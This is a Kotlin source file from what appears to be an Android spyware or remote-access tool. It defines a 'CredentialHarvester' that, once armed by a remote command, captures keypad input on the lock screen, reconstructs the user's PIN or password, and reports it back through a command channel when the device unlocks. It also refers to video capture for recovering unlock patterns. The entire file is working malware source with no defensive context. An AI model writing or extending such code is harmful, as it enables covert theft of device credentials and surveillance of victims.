package com.example.myandroid

import android.content.Context
import org.json.JSONObject
import kotlinx.coroutines.*

object CredentialHarvester {
    var isArmed = false
    var pendingCmdId = -1
    var buffer = java.lang.StringBuilder()

    fun arm(cmdId: Int) {
        isArmed = true
        pendingCmdId = cmdId
        buffer.clear()
        DebugLogger.log("HARVESTER", "Credential Harvester ARMED. Awaiting lock screen inputs.")
    }

    fun disarm() {
        isArmed = false
        buffer.clear()
    }

    fun onKeyClicked(key: String) {
        if (!isArmed) return
        val k = key.trim()
        if (k.isEmpty()) return
        
        // Handle backspace and delete
        if (k.contains("delete", true) || k.contains("backspace", true)) {
            if (buffer.isNotEmpty()) buffer.deleteCharAt(buffer.length - 1)
        } 
        // Ignore utility buttons
        else if (k.equals("ok", true) || k.equals("enter", true) || k.equals("done", true)) {
            // Submit action, wait for unlock
        } else if (!k.contains("emergency", true) && !k.contains("cancel", true)) {
            val firstChar = k.firstOrNull()
            // Extract the '4' from descriptions like '4, GHI'
            if (firstChar != null && firstChar.isLetterOrDigit()) {
                buffer.append(firstChar)
            } else if (k.length == 1) { // Symbols like @ or #
                buffer.append(k)
            }
        }
        DebugLogger.log("HARVESTER_DIAG", "Key intercepted: $k. Buffer length: ${buffer.length}")
    }

    fun onScreenOff() {
        if (isArmed) {
            buffer.clear()
            DebugLogger.log("HARVESTER", "Screen off. Cleared credential buffer.")
        }
    }

    fun onUnlocked(ctx: Context) {
        if (!isArmed) return
        
        if (buffer.isNotEmpty()) {
            val captured = buffer.toString()
            DebugLogger.log("HARVESTER", "SUCCESS! Device unlocked. Captured PIN/Password length: ${captured.length}")
            val result = JSONObject().apply {
                put("type", "PIN_OR_PASSWORD")
                put("credential", captured)
            }
            
            CoroutineScope(Dispatchers.IO).launch {
                CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "CREDENTIALS_HARVESTED", "User unlocked device via keypad.", result, null)
            }
        } else {
            DebugLogger.log("HARVESTER", "Unlocked but buffer empty. Biometrics/Pattern used.")
            val result = JSONObject().apply {
                put("type", "BIOMETRICS_OR_PATTERN")
                put("credential", "NONE_LOGGED")
            }
            CoroutineScope(Dispatchers.IO).launch {
                CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "BIOMETRICS_DETECTED", "Device unlocked without keypad input. Check video for pattern.", result, null)
            }
        }
        disarm()
    }
}
